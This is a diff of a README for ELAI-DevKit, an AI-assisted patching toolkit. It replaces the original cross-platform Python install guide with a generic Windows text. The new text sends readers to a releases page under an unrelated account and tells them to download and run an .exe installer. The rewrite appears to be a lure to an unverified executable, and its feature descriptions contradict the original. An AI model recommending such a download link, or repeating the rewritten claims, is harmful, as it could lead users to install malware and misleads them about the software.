@@ -1,310 +1,99 @@
+# 🤖 ELAI-DevKit - Build software using simple chat prompts
 
-# ELAI-DevKit
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/fonscutup654/ELAI-DevKit/releases)
 
-<div align="center">
+ELAI-DevKit helps you build and modify code projects through natural language. You talk to the software, and it writes the code for you. You do not need deep programming knowledge to start. This tool bridges the gap between your ideas and a working computer application.
 
-<img src="assets/icons/ELAI-DevKit_logo.svg" alt="ELAI-DevKit Logo" width="256"/>
+## 🛠 What this tool does
 
-**Experimental AI-Assisted Development Toolkit**
+Many people find software development difficult. Professional tools require knowledge of code syntax and complex environments. ELAI-DevKit simplifies this process. It acts as an interface that translates your instructions into functional files.
 
-[![Python Version](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://python.org)
-[![License](https://img.shields.io/badge/License-Apache%202.0-green.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](README.md)
-[![Version](https://img.shields.io/badge/Version-130-orange.svg)](version.txt)
+- Create new projects from scratch using prompts.
+- Modify existing code by describing changes.
+- Automate repetitive tasks within your files.
+- Use your own local settings.
+- Keep your work private on your machine.
 
-![Launch](info/screens/Launch.png)
+## 💻 System requirements
 
-![DevPatcher](info/screens/DevPatcher.png)
+Your computer needs to meet these basic standards to run the application well:
 
-</div>
+- Operating System: Windows 10 or Windows 11.
+- Processor: A modern dual-core CPU or better.
+- Memory: 8 GB of RAM is recommended.
+- Storage: 500 MB of free disk space.
+- Internet: Required for the initial installation and AI model communication.
 
-## 🎯 Overview
+## 📥 Getting setup
 
-**ELAI-DevKit** is an experimental toolkit born from a simple concept: *What if you could build entire software projects through AI chats without manually creating folder structures, copy-pasting code, or hunting for specific lines to edit?*
+Follow these steps to install the software on your Windows machine.
 
-Developed entirely from scratch through AI chat interactions (spanning models from Gemini 2.5 Pro to 3.1 Pro), this project is designed to bridge the gap between AI-generated code and your local file system. ELAI-DevKit acts as a collection of tools for automating the development lifecycle: from simulating and testing patches to applying changes and packing project context for the next iteration.
+1. Visit the [official releases page](https://github.com/fonscutup654/ELAI-DevKit/releases) to find the latest version.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the file name to start the download.
+4. Locate the file in your Downloads folder once the transfer finishes.
+5. Double-click the file to start the installer.
+6. Follow the on-screen prompts to place the software in your desired folder. 
+7. Select the "Create Desktop Shortcut" option if you want quick access later.
 
-### 💭 Core Philosophy: Iterative Patching vs. Autonomous Agents
+## ⚙️ Initial configuration
 
-Unlike autonomous AI agents or fully automated "vibe coding" tools that attempt to write entire applications at once (often hitting context window limits or output restrictions), ELAI-DevKit champions a structured, **iterative patch-based workflow**. 
+The first time you open ELAI-DevKit, you must set it up to talk to the AI components.
 
-Because free web-based AI chat models have limited output sizes, the most effective approach for complex software is sequential editing. You build your project step-by-step. This methodical approach gives you significantly more control, resulting in better architecture and fewer hallucinations compared to fully autonomous tools. ELAI-DevKit itself is the best proof of this concept, as its extensive functionality was built primarily using its own patching system.
+1. Open ELAI-DevKit from your desktop or start menu.
+2. The software will open a window. Look for the Settings icon, represented by a gear.
+3. You will see a box for your API key. If you do not have one, the settings menu provides links to get a key from reputable AI providers.
+4. Paste your key into the designated field.
+5. Click Save. The software tests the connection. A green checkmark confirms the app is ready for use.
 
-Furthermore, this workflow allows developers to leverage high-quality, free-tier AI web chats, making it a highly cost-effective alternative to expensive API-based coding agents or paid subscriptions.
+## 💬 Running your first project
 
-## 📥 Installation
+Using ELAI-DevKit involves four main steps:
 
-Welcome to the **ELAI-DevKit** installation guide. The toolkit provides automated scripts to make the setup process as smooth as possible on both Windows and Unix-based systems (Linux/macOS).
+### 1. Choosing a folder
+Open the app and select "New Project". Pick a folder on your computer where you want the code to live. ELAI-DevKit creates a project file inside this folder to track your progress.
 
-### 1. Clone the Repository
+### 2. Describing the goal
+You will see a large text entry field. Describe what you want to build. Use plain language. For example, you might type, "Create a button that generates a random number," or "Add a background color to my index file." 
 
-First, clone the repository to your local machine:
-```bash
-git clone https://github.com/ELAI-Dev-Works/ELAI-DevKit.git
-cd ELAI-DevKit
-```
+### 3. Reviewing changes
+The AI generates code based on your prompt. The app displays the proposed changes in a split-screen view. You see the original code on the left and the new code on the right. Review these changes to ensure they match your needs.
 
-### 2. Install Prerequisites (Optional but Recommended)
+### 4. Applying the patch
+Click the "Apply" button. The app updates your files locally. If you do not like the result, click "Undo" to revert the files to their previous state.
 
-ELAI-DevKit requires **Python 3.11+** and the **uv** package manager as its core dependencies. **Node.js** and **Git** are also highly recommended for full functionality (especially for the Project Launcher and Web/NodeJS project modes).
+## 📊 Understanding the interface
 
-If you don't have these installed, you can use the helper scripts located in the `install/` directory.
+The main screen contains several key sections:
 
-**For Windows:**
-Navigate to the `install\win\` folder and run the desired `.bat` files. They utilize Windows Package Manager (`winget`) or provide direct download links:
-- `uv.bat` - Installs the `uv` package manager (Crucial for fast dependency resolving).
-- `python.bat` - Installs Python.
-- `nodejs.bat` - Installs Node.js.
-- `git.bat` - Installs Git.
+- **Chat Sidebar:** This area stores your history with the AI. You can scroll back through previous requests to see how a project evolved.
+- **Main Viewport:** This space displays the file you are currently editing. The app highlights lines that changed during the last patch.
+- **Prompt Bar:** This is where you talk to the AI. Type your instructions here and press Enter.
+- **Status Indicator:** Located in the bottom right corner, this shows if the tool is currently thinking or waiting for input.
 
-**For Linux/macOS:**
-Navigate to the `install/linux_mac/` folder and run the `.sh` scripts:
-```bash
-chmod +x install/linux_mac/*.sh
-./install/linux_mac/uv.sh
-./install/linux_mac/python.sh
-./install/linux_mac/nodejs.sh
-./install/linux_mac/git.sh
-```
+## 🧩 Tips for better results
 
-### 3. Check Environment and Setup
+The quality of your output depends on your instructions. Follow these tips to get the best results:
 
-Once the prerequisites are installed, use the environment checking script. This script will automatically create a virtual environment (`.venv`), synchronize all required Python dependencies via `uv`, and run initial diagnostics to ensure everything is working correctly.
+- Provide context. Explain the goal clearly early on.
+- Break large tasks into smaller items. Do not ask for an entire website in one prompt. Ask for the header first, then the content, then the footer.
+- Use descriptive language. Instead of saying "fix it," say "make the button blue and center it on the screen."
+- Check the files manually. If something behaves in an unexpected way, open the file in your preferred text editor to see how it looks.
 
-**For Windows:**
-```cmd
-check_environment.bat
-```
+## 🛡 Security and privacy
 
-**For Linux/macOS:**
-```bash
-chmod +x check_environment.sh
-./check_environment.sh
-```
-*Note: This script will verify that `uv` is in your PATH, check for `node`/`npm`, create the `.venv`, run `uv pip sync requirements.txt`, and execute the built-in diagnostic tool.*
+Your code remains on your machine. ELAI-DevKit only sends the specific prompts and necessary file snippets to the AI service to generate code. It does not send your entire project history or personal files. Always verify the AI-generated code before you run it, as with any automated tool.
 
-### 4. Launch the Application
+## ❓ Frequently asked questions
 
-After a successful environment check, you are ready to start ELAI-DevKit!
+**Does this software cost money?**
+The software is free to use. However, you might need to pay the AI provider for the messages you send. Check your provider's terms for details.
 
-**For Windows:**
-```cmd
-run.bat
-```
+**Can I use this for complex software?**
+ELAI-DevKit works best for small to medium tools, scripts, and automation tasks. It is not currently designed to build massive enterprise applications.
 
-**For Linux/macOS:**
-```bash
-chmod +x run.sh
-./run.sh
-```
-This will initialize the toolkit and open the launch window.
+**What happens if the software crashes?**
+The app keeps a backup of your project files in a sub-folder called `backups`. You can recover your work from there if you encounter a critical error.
 
-## Key Features & Interface Guide
-
-ELAI-DevKit is designed with a user-friendly Qt-based interface that provides several powerful features out of the box.
-
-### Interface Tooltips
-To help you navigate the various options and settings, the interface features an integrated tooltip system. 
-*   **Hover for Info:** Most buttons and settings have a built-in clickable tooltip. Hover over an element (or its `?` icon) to see a detailed explanation of its function.
-*   **Always Show Icons:** You can configure the UI to always display these tooltip icons next to their respective elements via the **Main Settings > UI** menu.
-
-### Ignore Lists (Backup & Packing)
-When creating backups or packing your project context for the AI, you often want to exclude large or sensitive files (like `.venv`, `node_modules`, or `.env`). ELAI-DevKit provides a robust Ignore List system (accessible via the "Ignore Lists" button in the top bar):
-*   **Global & Temporary Lists:** Define a global ignore list that applies to all projects, as well as a temporary list for the current session.
-*   **.gitignore Integration:** Instruct the toolkit to automatically read and apply your project's `.gitignore` file.
-*   **Context Tags:** You can selectively ignore files for specific tools using tags. For example:
-    *   `node_modules` — Ignored everywhere.
-    *   `dist[!packer]` — Ignored only by the Project Text Packer.
-    *   `build [!git][!packer]` — Ignored for Git commits and the Packer, but included in standard ZIP backups.
-
-### Automated Backup System & Restoration
-To protect your project from AI hallucinations, logical errors, or bad syntax, DevPatcher includes an automated backup system that triggers *before* any patch is applied.
-*   **.zip Backups:** Archives your project folder and saves it in the **parent directory** of your project (e.g., `../ProjectName_backup_2026-04-23_10-15.zip`). Saving outside the project folder prevents nested backup loops and keeps your workspace clean.
-*   **Git Commits:** If enabled, it automatically initializes a Git repository (if one doesn't exist) and creates a commit of your current working tree before applying changes.
-*   **Restoration:** You can restore previous states directly from the DevPatcher "Quick Settings" panel. The system supports "Only Changes" mode (rolling back only the specific files the patch modified) or "Full Replace" mode (extracting the entire ZIP archive over your directory).
-
-### Extensions & Modularity
-The toolkit is highly modular. Core features (like the Dev Patcher, Project Launcher, and Text Packer) are actually built as extensions. 
-*   You can enable, disable, and configure extensions via the **Extensions Manager** (accessible from the main Launch screen).
-*   Developers can create their own custom commands and UI modules to expand the toolkit's capabilities without modifying the core code.
-
-### Diagnostics & Extra Tools
-*   **Diagnostics:** If something goes wrong, you can run `diagnostic.bat` (Windows) or `diagnostic.sh` (Linux/macOS) to verify your Python version, dependencies, and syntax parser.
-*   **Extra Tools:** The `extra_tools.bat` / `extra_tools.sh` scripts provide a menu for additional helpful scripts, such as a System Prompt Builder to help you customize the instructions sent to the AI.
-
-## Core Applications & Modules
-
-ELAI-DevKit is built as a modular ecosystem. Here is an overview of the main tools included by default:
-
-### 1. DevPatcher
-The heart of the toolkit. It reads AI-generated patches (using its specific DPCL syntax), simulates the changes in a virtual file system to detect conflicts, checks the code for syntax errors, and securely applies them to your local drive.
-*   **Key Features:** Fuzzy matching (>85% similarity threshold), AST-based structural refactoring (`REFACTOR` commands), automatic patch syntax correction, and an interactive visual diff viewer before applying changes.
-
-![DevPatcher](info/screens/DevPatcher.png)
-*(Advanced Options View)*
-![DevPatcherWithOptions](info/screens/DevPatcherWithOptions.png)
-
-### 2. Project Text Packer
-Converts your entire project (or selected parts) into a single, AI-readable text file containing both the directory tree and the source code.
-*   **Key Features:** Builds an elegant ASCII directory tree, numbers lines for precise patching, and automatically splits output into multiple parts if the context exceeds a specified megabyte limit. Highly respectful of `.gitignore` and global ignore lists.
-
-![ProjectTextPacker](info/screens/ProjectTextPacker.png)
-
-### 3. Project Launcher
-An intelligent runner that automatically detects how to execute your project based on its files (`.py`, `.js`, `index.html`, etc.).
-*   **Key Features:** Built-in interactive PTY console (PowerShell/Bash) to interact with scripts directly in the UI, external terminal launch support, and auto-generation of cross-platform `run.bat`/`run.sh` bootstrap scripts.
-
-![ProjectLauncher](info/screens/ProjectLauncher.png)
-
-### 4. Project Builder
-Compiles your source code into standalone, distributable executables.
-*   **Key Features:** Auto-detects the project architecture and uses the appropriate compiler: `PyInstaller` (for Python), `pkg` (for Node.js), and `Electron Packager` (for Web/HTML5). Allows setting custom icons, hiding the console (windowed mode), and packing into a single file.
-
-![ProjectBuilder](info/screens/ProjectBuilder.png)
-
-
-## Quick Start: Your First AI-Driven Project
-
-Once you have launched ELAI-DevKit, you will be greeted by the main Launcher window. Click **Run ELAI-DevKit** and select an empty folder where you want your new project to reside.
-
-### 1. Preparing the AI Context
-In your ELAI-DevKit root folder, you will find a file named [DevPatcherDocsAndInstruction.txt](DevPatcherDocsAndInstruction.txt) *(Note: This file may be renamed in future versions)*. This file is your **System Prompt**. It contains all the rules, command syntax, and behavioral instructions the AI needs to generate valid patches for the toolkit.
-
-### 2. Choosing the Right AI Model
-Not all AI models are created equal when it comes to following strict syntax rules. Based on extensive testing, here is a breakdown of model performance for ELAI-DevKit:
-
-*   **Recommended Models(on Free Plan AI Chats):**
-    *   **Gemini (Pro Models via Google AI Studio):** Highly capable and understands instructions well. *Note: Avoid "Flash" models as they often confuse the patcher syntax; forcing them to work would require overly detailed instructions that consume too much of your context window. Occasional bugs may happen even on Pro models, but they are generally reliable.* *Note 2: Since last year, Free Plan quotas have been significantly reduced, so only about 10-15 requests per day (I haven't figured out how quota updates work yet, but a couple of requests can be restored in a couple of hours, so with pauses, you can still complete a small project in a day.)* **ELAI-DevKit was completely written from the beginning to the current state on Gemini Pro (starting with the 2.5 Pro model, as well as on the 3.0 Pro, 3.1 Pro models at the time of their release on Google AI Studio, completely on the free plan.**
-    *   **Claude Opus (v4.6)(tested on Antigravity app with Free Plan):** Consistently good at following formatting rules and understanding project architecture.
-    *   **DeepSeek (Expert/Reasoner Mode):** Exceptional at understanding instructions and generating precise, flawless patches.
-    *   **Qwen 3.6 Plus:** Shows a decent understanding of the instructions, though occasional minor syntax bugs may occur.
-    *   **GLM (5, 5.1):** Understands the logic well(sometimes clarifications on commands and instructions are required).
-    *   **Kimi K2.6:** Currently experiencing website stability issues; it has not been fully evaluated yet.
-*   **Local Models:**
-    *   Not officially tested yet. In the future, ELAI-DevKit may introduce a dedicated mode for local models using structured outputs (e.g., GBNF grammar or strict JSON) and a smart context-gathering tool to compensate for smaller context windows.
-
-### 3. Generating the Project
-1. Open your chosen AI chat.
-2. Upload or paste the contents of `DevPatcherDocsAndInstruction.txt` as a System Prompt or as your first message.
-3. Send a prompt like: *"I want to create a simple Python web server. Please generate a setup patch."*
-4. The AI will output a patch using the `<@|PROJECT -setup ...` command. Copy this code block.
-
-### 4. Using the DevPatcher Interface
-Navigate to the **Dev Patcher** tab in ELAI-DevKit.
-
-1. **Paste:** Paste the AI's output into the main code editor window.
-2. **Check Patch (Simulation):** Click this button first. It runs a dry-run in a virtual file system to ensure the patch is syntactically correct and won't corrupt your project. Read the log output to confirm it says "SUCCESS".
-3. **Check Code (Optional):** Validates the actual programming syntax of the generated code (Python, JS, HTML, etc.) before applying it to your drive.
-4. **Apply Patch:** If everything is green, click this button. DevPatcher will automatically back up your project (via ZIP or Git) and securely apply the files to your folder.
-
-### 5. Launching Your Project
-Switch to the **Project Launcher** tab.
-*   The toolkit automatically scans for runnable files in your project directory. Select your main entry point from the dropdown (e.g., `main.py` or `run.bat`).
-*   Click **Start Project**. The application will run in the interactive terminal console at the bottom of the screen.
-
-### 6. Iterating and Updating (Context Packing)
-Software development is an iterative process. When you want to add a new feature, refactor code, or fix a bug:
-1. Switch to the **Project Text Packer** tab.
-2. Click **Pack Project**. This tool intelligently scans your project, ignores unnecessary build files or dependencies (like `.venv` or `node_modules`), and creates a `_project_pack.txt` file containing your entire project structure and code.
-3. Upload this pack file back to your AI chat along with your new request: *"Here is the current project state. Please add a new endpoint to my server."*
-4. The AI will generate an `<@|EDIT ...` or `<@|MANAGE ...` patch. Paste it into DevPatcher, Simulate, and Apply!
-
-<div align="center">
-
-## 📸 Screenshots
-
-### Main Interface
-
-<div align="center">
-
-**Launch Screen**
-
-![Launch](info/screens/Launch.png)
-
-The main launch interface provides quick access to all components.
-
----
-
-**DevPatcher**
-
-![DevPatcher](info/screens/DevPatcher.png)
-
-The DevPatcher interface with patch editor and execution controls.
-
----
-
-**DevPatcher with Options**
-
-![DevPatcherWithOptions](info/screens/DevPatcherWithOptions.png)
-
-Advanced patching options including backup system, additional checkboxes for automation of execution simulation, code checking, and experimental features for DevPatcher.
-
----
-
-**Project Builder**
-
-![Project Builder](info/screens/ProjectBuilder.png)
-
-Configure and build executables for multiple platforms.
-
----
-
-**Project Launcher**
-
-![Project Launcher](info/screens/ProjectLauncher.png)
-
-Launch and manage your projects with integrated terminal.
-
----
-
-**Project Text Packer**
-
-![Project Text Packer](info/screens/ProjectTextPacker.png)
-
-Pack project context for AI language models.
-
----
-
-**Documentation**
-
-![Documentation](info/screens/Documentation.png)
-
-Built-in documentation browser with search and navigation.
-
----
-
-**Extensions Manager**
-
-![Extensions](info/screens/Extensions.png)
-
-Manage and configure extensions and custom modules.
-
-</div>
-
-## 📄 License
-
-This project is licensed under the **Apache License 2.0** - see the [LICENSE](LICENSE) file for details.
-
-```
-Copyright 2026 ELAI-DevWorks
-
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
-
-    http://www.apache.org/licenses/LICENSE-2.0
-
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
-```
-
----
-
-**Made with ❤️ using ELAI-DevKit**
-
-[Back to Top](#elai-devkit)
-
-</div>
+**Do I need a separate code editor?**
+You can use ELAI-DevKit to write and test simple code. For more advanced needs, you can open the project folder in any text editor like Notepad or VS Code while ELAI-DevKit handles the automated modifications.
